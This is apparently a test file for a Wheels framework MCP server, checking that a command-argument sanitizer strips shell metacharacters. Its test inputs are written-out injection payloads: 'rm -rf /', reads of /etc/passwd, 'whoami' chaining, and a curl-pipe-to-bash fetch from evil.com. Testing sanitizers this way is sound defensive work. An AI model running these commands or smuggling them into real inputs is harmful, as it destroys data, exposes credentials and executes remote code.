component extends="wheels.WheelsTest" {

	function run() {

		describe("MCP command argument sanitization", () => {

			beforeEach(() => {
				mcp = new wheels.public.mcp.McpServer();
			});

			it("has a $sanitizeCommandArg function", () => {
				expect(structKeyExists(mcp, "$sanitizeCommandArg")).toBeTrue();
			});

			it("strips semicolons used for command chaining", () => {
				var result = mcp.$sanitizeCommandArg("model; rm -rf /");
				expect(result).toBe("model rm -rf /");
			});

			it("strips pipe characters", () => {
				var result = mcp.$sanitizeCommandArg("model | cat /etc/passwd");
				expect(result).toBe("model  cat /etc/passwd");
			});

			it("strips ampersand characters", () => {
				var result = mcp.$sanitizeCommandArg("model && whoami");
				expect(result).toBe("model  whoami");
			});

			it("strips backtick characters", () => {
				var result = mcp.$sanitizeCommandArg("model `whoami`");
				expect(result).toBe("model whoami");
			});

			it("strips dollar-paren subshell syntax", () => {
				var result = mcp.$sanitizeCommandArg("model $(cat /etc/passwd)");
				expect(result).toBe("model cat /etc/passwd");
			});

			it("strips redirect characters", () => {
				var result = mcp.$sanitizeCommandArg("model > /tmp/evil < /etc/passwd");
				expect(result).toBe("model  /tmp/evil  /etc/passwd");
			});

			it("strips newline-encoded characters", () => {
				// Actual newline/carriage-return bytes
				var result = mcp.$sanitizeCommandArg("model" & chr(10) & "whoami");
				expect(result).toBe("modelwhoami");
			});

			it("allows valid alphanumeric arguments unchanged", () => {
				var result = mcp.$sanitizeCommandArg("User");
				expect(result).toBe("User");
			});

			it("allows hyphens underscores dots commas equals slashes", () => {
				var result = mcp.$sanitizeCommandArg("first-name_attr.type,second=value/path");
				expect(result).toBe("first-name_attr.type,second=value/path");
			});

			it("allows spaces in arguments", () => {
				var result = mcp.$sanitizeCommandArg("firstName lastName email");
				expect(result).toBe("firstName lastName email");
			});

			it("strips a complex injection payload completely", () => {
				var result = mcp.$sanitizeCommandArg("User; curl http://evil.com/shell.sh | bash");
				expect(result).notToInclude(";");
				expect(result).notToInclude("|");
				// Only safe chars remain
				expect(ReFind('[^a-zA-Z0-9 _\-\.,=/]', result)).toBe(0);
			});

		});

	}

}
